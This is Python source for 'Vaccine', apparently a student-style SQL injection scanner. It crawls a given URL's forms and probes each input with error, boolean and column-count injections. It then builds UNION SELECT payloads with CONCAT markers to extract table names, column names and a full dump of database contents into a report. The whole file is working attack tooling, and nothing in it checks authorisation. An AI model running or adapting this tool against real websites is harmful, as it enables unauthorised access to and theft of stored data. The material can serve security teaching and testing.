from query import Query
import os
import re
import urllib.parse
from form import Form
import requests
from prettytable import PrettyTable
from bs4 import BeautifulSoup

class Vaccine:
    usage = "Usage: ./vaccine [-oX] URL\n \
    options:\n\
        * -o <file_name>: Archive file, if not specified it will be stored in a default one\n \
        * -X <GET|POST>: Type of request, if not specified GET will be used.\n\
        * -d <max_depth>` Maximun crawl depth. 0 by default, maximum 5\n"

    def __init__(self, args):
        self.report = ""
        self.archive = "Report.txt"
        self.request = "GET"
        self.max_depth = 0
        self.url_done = []
        self.forms = []
        self.vul = False
        self.engine = ""

        i = 0
        while i < len(args):
            if (args[i][0] == '-'):
                if len(args[i]) < 2:
                    raise ValueError("Bad option call")
                
                match args[i][1]:
                    case 'o':
                        i += 1
                        self.archive = args[i]
                    case 'X':
                        i += 1
                        self.request = args[i].upper()
                    case 'd':
                        i += 1
                        self.max_depth = int(args[i])
                    case _:
                        raise ValueError("Wrong option")
            else:
                if i < len(args) - 1:
                    raise ValueError("URL should be last")
                self.url = args[i]
            i += 1
        self.check_args()
        self.init_session()

    def check_args(self):
        # Check if valid request
        if not (self.request == "GET" or self.request == "POST"):
            raise ValueError("Request must be GET or POST")
        # check max depth validity
        if self.max_depth < 0 or self.max_depth > 5:
            raise ValueError("Crawling depth must be between 0 and 5")
        # Check for valid url
        parsed = urllib.parse.urlparse(self.url)
        if not parsed.scheme or not parsed.netloc:
            raise ValueError("Invalid url")
        # check archive file is valid
        if len(self.archive) > 100:
            raise ValueError("File name must be less than 100 character")
        if os.access(self.archive, os.F_OK) and not os.access(self.archive, os.W_OK):
            raise ValueError("File already exists and lack permission's access")
    
    def init_session(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })
        self.add_report(('-' * 20 + " VULNERABILITY REPORT " + '-' * 20).center(70) + "\n\n")
        self.add_report("+" + "-" * 68 + "")
        self.add_report("|".ljust(69) + "|")
        self.add_report(f"|  Target URL: {self.url}".ljust(69) + "|")
        self.add_report("|".ljust(69) + "|")
        self.add_report(f"|  Request Method: {self.request}".ljust(69) + "|")
        self.add_report("|".ljust(69) + "|")
        self.add_report(f"|  Crawl Depth: {self.max_depth}".ljust(69) +"|")
        self.add_report("|".ljust(69) + "|")
        self.add_report("+" + "-" * 68 + "\n\n")
    
    def add_report(self, text):
        self.report += text + "\n"
    
    def send(self, url, data):
        if self.request == 'GET':
            return self.session.get(url, params=data)
        elif self.request == 'POST':
            return self.session.post(url, data=data)

    def union_query(self, input, select_query, from_query=""):
        ''' Build UNION Query based on the number of columns found '''
        cols = ['NULL'] * input['col']
        cols[0] = f"CONCAT('<<<SQLI>>>', {select_query}, '<<<END>>>')"
        payload = f"' UNION SELECT {', '.join(cols)} {from_query}"
        return payload

    def run_query(self, form, select_query, from_query):
        ''' Run a query on vulnerable input '''
        for input in form.inputs:
            if "error" in input['vul'] or "union" in input['vul']:
                data = {inp['name']: inp['value'] or 'test' for inp in form.inputs}
                payload =  self.union_query(input, select_query, from_query)
                print(payload) # DEV
                data[input['name']] = payload
                try:
                    return self.send(form.url, data).text
                except:
                    return None
        return None

    def get_forms(self, url, depth):
        ''' Get all the forms from the url and crawl to set depth '''

        if url in self.url_done:
            return

        print(f"********** {url} | {depth} **********") # DEV

        # Get the page content
        try:
            response = self.session.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
        except:
            return

        # Parse and store each form
        for f in soup.find_all('form'):
            form = Form(self.url, f)
            if form.method == self.request and form not in self.forms:
              self.forms.append(form)

        self.url_done.append(url)

        # Scrap all the links in the page
        if depth > 0:
            base_domain = urllib.parse.urlparse(self.url).netloc
            for link in soup.find_all('a', href=True):
                href = link['href']
                if not href.startswith(("#", "mailto:", "javascript")):
                    link_url = urllib.parse.urljoin(url, href)
                    link_domain = urllib.parse.urlparse(link_url).netloc
                    if link_domain == base_domain:
                        self.get_forms(link_url, depth - 1)

    def check_all_inputs(self, form, query):
        ''' Check the query with all inputs of the form'''
        responses = []

        i = 0
        while i < len(form.inputs):
            data = {}
            for idx, inp in enumerate(form.inputs):
                if idx == i:
                    target = inp['name']
                    data[inp['name']] = query
                else:
                    data[inp['name']] = inp['value'] or 'test'
            try:
                res = self.send(form.url, data)
                responses.append({
                    'input': target,
                    'response': res
                })
            except Exception as e:
                self.add_report(f"Form submission failed for {form.url}: {e}")
                return responses
            i += 1
        return responses
    
    def union_all_inputs(self, form, test):
        ''' Check the query with all inputs of the form'''
        responses = []

        i = 0
        while i < len(form.inputs):
            data = {}
            for idx, inp in enumerate(form.inputs):
                if idx == i:
                    target = inp['name']
                    data[inp['name']] = self.union_query(inp, test)
                else:
                    data[inp['name']] = inp['value'] or 'test'
            try:
                res = self.send(form.url, data)
                responses.append({
                    'input': target,
                    'response': res
                })
            except Exception as e:
                self.add_report(f"Form submission failed for {form.url}: {e}")
                return responses
            i += 1
        return responses
    
    def check_vulnerability(self):
        ''' Check different vulnerabilities '''
        if not self.forms:
            self.add_report(f"NO FORMS FOUND WITH {self.request}")
            return

        # Error
        query = Query.checks['error'][0]
        for form in self.forms:
            responses = self.check_all_inputs(form, query)
            for res in responses:
                # print(res['response'].text)  # DEV
                for engine, msg in Query.errors.items():  # DEV
                    if msg.lower() in res['response'].text.lower():
                        self.engine = engine
                        form.vul = True
                        self.vul = True
                        for inp in form.inputs:
                            if inp['name'] == res['input']:
                                inp['vul'].append("error")
                                break
        
        # Boolean
        true_query = Query.checks['boolean'][0]
        false_query = Query.checks['boolean'][1]
        for form in self.forms:
            true_responses = self.check_all_inputs(form, true_query)
            false_responses = self.check_all_inputs(form, false_query)

            for true_res, false_res in zip(true_responses, false_responses):
                if true_res['response'].text != false_res['response'].text:
                    form.vul = True
                    self.vul = True
                    for inp in form.inputs:
                        if inp['name'] == true_res['input']:
                            inp['vul'].append("boolean")
                            break
        # Columns count
        found = False
        for i in range(1, 11):
            if found:
                break
            query = Query.checks['columns'][0].format(i)
            for form in self.forms:
                responses = self.check_all_inputs(form, query)
                for res in responses:
                    if res['response'].status_code == 500 or "unknown column" in res['response'].text.lower()\
                            or "ORDER BY" in res['response'].text.lower():
                        print(f"Count: {i}, response: {res['response'].text}") # DEV
                        form.vul = True
                        self.vul = True
                        for inp in form.inputs:
                            if inp['name'] == res['input'] and "columns" not in inp['vul']:
                                inp['vul'].append("error")
                                inp['col'] = i - 1 if i > 1 else 1
                                found = True
                                break

        # Union
        test = "'Test12345!'"
        for form in self.forms:
            responses = self.union_all_inputs(form, test)
            for res in responses:
                if res['response'].status_code == 200\
                        and test.replace("'", "").lower() in res['response'].text.lower():
                    form.vul = True
                    self.vul = True
                    for inp in form.inputs:
                        if inp['name'] == res['input'] and "union" not in inp['vul']:
                            inp['vul'].append(f"union")
                            break

        self.report_vulnerability()
    
    def report_vulnerability(self):
        self.add_report("=" * 70)
        self.add_report("VULNERABILITY CHECK".center(70))
        self.add_report("=" * 70 + "\n")

        # Error based:
        for name, queries in Query.checks.items():
            self.add_report(f"=== Check: {name}, with: \n")
            line = ' \n       -> '
            self.add_report(f"       -> {line.join(queries)}")
            self.add_report(f"\n")
        
        for form in self.forms:
            self.add_report(f"== Form tested: {form.action}\n")
            if not form.vul:
                self.add_report(f"NO VULNERABILITY FOUND\n")
                continue
            table = PrettyTable()
            list_check = ["Input", "error", "boolean", "union"]
            table.field_names = list_check
            for input in form.inputs:
                row = [input['name']]
                for check in list_check[1:]:
                    vul = "V" if check in input['vul'] else " "
                    row.append(vul)
                table.add_row(row)
            self.add_report(str(table))
            self.add_report("\n")

    def extract_data(self, response):
        ''' Extract data between markers '''
        if not response:
            return None
        
        import re
        match = re.search(r'<<<SQLI>>>(.*?)<<<END>>>', response, re.DOTALL)
        if match:
            return match.group(1).strip()
        return None
                    
    def extract_infos(self):

        if not self.vul:
            return
        self.add_report("=" * 70)
        self.add_report("DATA EXTRACTION".center(70))
        self.add_report("=" * 70 + "\n")

        if not self.engine:
            self.add_report("==> UNKNOWN ENGINE, NO EXTRACTION POSSIBLE")
            return

        self.add_report(f"==> ENGINE: {self.engine}\n")

        tables = None
        columns = None
        dump = None
        for form in self.forms:
            if tables and columns:
                break
            if not form.vul:
                continue
            if not tables:
                query = Query.tables[self.engine]
                tables = self.run_query(form, query['select'], query['from'])
            if not columns:
                query = Query.columns[self.engine]
                columns = self.run_query(form, query['select'], query['from'])
            if not dump:
                query = Query.dump[self.engine]
                dump = self.run_query(form, query['select'], query['from'])
        
        self.add_report(f"==> TABLES\n")
        tables = self.extract_data(tables)
        tables = tables if tables else "No Table extracted"
        self.add_report(tables[:1000] + "\n")

        self.add_report(f"==> COLUMNS\n")
        columns = self.extract_data(columns)
        columns = columns if columns else "No Columns extracted"
        self.add_report(columns[:1000] + "\n")

        self.add_report(f"==> FULL DUMP\n")
        print(dump) # DEV
        dump = self.extract_data(dump)
        dump = dump if dump else "No Full Dump extracted"
        self.add_report(dump[:10000] + "\n")

    # def parse_extraction(self, response):
    #     ''' Extract data from XPATH error messages '''
    #     if not response:
    #         return None
        
    #     if self.engine == 'MySQL':
    #         if 'XPATH syntax error' in response:
    #             match = re.search(r"'~([^']+)'", response)
    #             if match:
    #                 data = match.group(1)
    #                 data = data.replace('\x3a', ':')  # 0x3a = :
    #                 data = data.replace('\x7c', '|')  # 0x7c = |
    #                 data = data.replace('\x2c', ',')  # 0x2c = ,
    #                 return data
    #         elif 'near' in response.lower():
    #             match = re.search(r"near '([^']+)'", response)
    #             if match:
    #                 return match.group(1)
        
    #     elif self.engine == 'Microsoft':
    #         if 'Conversion failed' in response:
    #             match = re.search(r"Conversion failed for value '([^']+)'", response)
    #             if match:
    #                 return match.group(1)
        
    #     elif self.engine == 'PostgreSQL':
    #         if 'invalid input syntax' in response.lower():
    #             match = re.search(r"invalid input syntax[^:]*: \"([^\"]+)\"", response)
    #             if match:
    #                 return match.group(1)
        
    #     elif self.engine == 'Oracle':
    #         if 'ORA-' in response:
    #             match = re.search(r"ORA-\d+: (.+?)(?:\n|$)", response)
    #             if match:
    #                 return match.group(1)
        
    #     return None
        
    def __str__(self):
        return (f"Vaccine:\n  * URL:      {self.url}\n\
  * Request:  {self.request}\n * Archive:  {self.archive}")
    
    def clean(self):
        ''' Write report in file and close the session'''
        self.add_report(('-' * 28 + " END " + '-' * 28).center(70))
        with open(self.archive, 'w') as file:
            file.write(self.report)
        session = getattr(self, "session", None)
        if session:
            session.close()

    def __exit__(self):
        self.clean()

    def __del__(self):
        self.clean()
